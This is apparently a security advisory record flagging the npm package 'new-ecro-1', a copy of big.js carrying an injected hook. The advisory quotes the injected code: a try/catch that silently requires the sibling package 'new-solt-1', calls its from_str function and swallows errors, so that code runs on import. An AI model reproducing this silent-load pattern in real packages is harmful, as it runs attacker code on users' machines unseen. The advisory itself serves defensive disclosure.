summary: Trojanized big.js clone silently loads sibling package new-solt-1 on require
details: Package ships a verbatim copy of the big.js library source (including the upstream MikeMcl/big.js copyright and repo URL) but is published under the unrelated name 'new-ecro-1'. Inside the module's top-level IIFE, an injected try/catch at big.js:606 silently requires a sibling package and invokes its exported function: `try { const doc = require("new-solt-1"); doc.from_str().then(e => { }).catch(e => { }) } catch (error) { }`. Errors are swallowed so the user never sees the failure. The sibling 'new-solt-1' is declared in package.json as a runtime dependency, so any consumer doing `require('new-ecro-1')` auto-executes attacker-controlled code from new-solt-1 at import time. The big.js content is a cover; the injected dependency-pull is the actual mechanism.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
